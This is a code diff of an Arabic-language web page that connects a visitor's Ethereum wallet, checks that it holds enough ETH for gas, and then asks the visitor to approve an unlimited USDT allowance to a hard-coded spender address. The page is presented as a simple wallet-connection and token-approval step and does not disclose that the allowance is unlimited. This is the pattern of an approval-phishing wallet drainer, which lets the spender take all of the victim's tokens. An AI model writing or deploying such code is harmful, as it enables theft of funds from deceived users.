@@ -1,58 +1,115 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8" />
-<title>طلب موافقة ERC-20</title>
-<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
+  <meta charset="UTF-8" />
+  <title>ربط المحفظة والموافقة مع فحص الرصيد</title>
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
+  <style>
+    body {
+      font-family: Tahoma, sans-serif;
+      direction: rtl;
+      text-align: center;
+      padding: 50px;
+      background: #f0f0f0;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      margin: 10px;
+      cursor: pointer;
+      border-radius: 10px;
+      border: none;
+      background-color: #ff9900;
+      color: white;
+    }
+    button:hover {
+      background-color: #e68a00;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #333;
+    }
+  </style>
 </head>
-<body style="font-family:Tahoma; direction:rtl; text-align:center; padding:50px;">
+<body>
 
-<h1>طلب موافقة ERC-20</h1>
-<button id="approveBtn" style="font-size:18px; padding:15px 30px; cursor:pointer;">اطلب موافقة</button>
-<p id="status" style="margin-top:20px; font-size:16px;"></p>
+<h1>ربط المحفظة والموافقة على التوكن</h1>
+<button id="connectBtn">ربط المحفظة</button>
+<button id="approveBtn" style="display:none;">اعتماد التوكن</button>
+<p id="status">يرجى ربط المحفظة أولاً</p>
 
 <script>
+  const connectBtn = document.getElementById('connectBtn');
   const approveBtn = document.getElementById('approveBtn');
   const status = document.getElementById('status');
 
-  approveBtn.onclick = async () => {
-    if (!window.ethereum) {
-      status.textContent = 'يرجى تثبيت MetaMask أولاً';
+  // غير هنا حسب التوكن والسبندر اللي تريد الموافقة لهم
+  const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // مثال USDT
+  const spenderAddress = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D'; // مثال سبندر
+  const minEthBalance = ethers.utils.parseEther('0.01'); // الحد الأدنى لرصيد ETH
+
+  let provider, signer;
+
+  async function checkBalance(address) {
+    const balance = await provider.getBalance(address);
+    return balance;
+  }
+
+  async function connectWallet() {
+    if (typeof window.ethereum === 'undefined') {
+      status.textContent = 'يرجى تثبيت MetaMask أو محفظة تدعم Ethereum.';
       return;
     }
 
-    const provider = new window.ethers.providers.Web3Provider(window.ethereum);
-
     try {
-      await provider.send('eth_requestAccounts', []);  // طلب ربط الحساب
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      signer = provider.getSigner();
+      const userAddress = await signer.getAddress();
 
-      const signer = provider.getSigner();
+      status.textContent = `تم الربط: ${userAddress}`;
 
-      const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';  // USDT
-      const spender = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D';       // عنوان المصرح له بالإنفاق
-      const amount = window.ethers.constants.MaxUint256;                   // أقصى مبلغ ممكن (مفتوح بلا حدود)
+      const balance = await checkBalance(userAddress);
+      if (balance.lt(minEthBalance)) {
+        status.textContent += `\nرصيد ETH قليل (${ethers.utils.formatEther(balance)} ETH). لا يمكن تنفيذ الموافقة بدون رصيد كافٍ.`;
+        approveBtn.style.display = 'none';
+        return;
+      }
 
+      approveBtn.style.display = 'inline-block';
+      status.textContent += '\nالرصيد كافي، يمكنك الضغط على "اعتماد التوكن".';
+
+    } catch (error) {
+      console.error(error);
+      status.textContent = 'فشل في ربط المحفظة.';
+    }
+  }
+
+  async function approveToken() {
+    try {
       const abi = [
-        "function approve(address spender, uint256 amount) external returns (bool)"
+        "function approve(address spender, uint256 amount) public returns (bool)"
       ];
+      const tokenContract = new ethers.Contract(tokenAddress, abi, signer);
+      const maxAmount = ethers.constants.MaxUint256;
 
-      const tokenContract = new window.ethers.Contract(tokenAddress, abi, signer);
+      status.textContent = 'جاري تنفيذ الموافقة...';
 
-      status.textContent = 'جارٍ إرسال طلب الموافقة...';
-
-      const tx = await tokenContract.approve(spender, amount);
-
-      status.textContent = 'الطلب أُرسل، في انتظار تأكيد المعاملة...';
-
+      const tx = await tokenContract.approve(spenderAddress, maxAmount);
       await tx.wait();
 
       status.textContent = 'تمت الموافقة بنجاح ✅';
 
-    } catch (err) {
-      console.error(err);
-      status.textContent = 'حدث خطأ أو تم رفض المعاملة ❌';
+    } catch (error) {
+      console.error(error);
+      status.textContent = 'فشل تنفيذ الموافقة ❌';
     }
-  };
+  }
+
+  connectBtn.addEventListener('click', connectWallet);
+  approveBtn.addEventListener('click', approveToken);
+
 </script>
 
 </body>
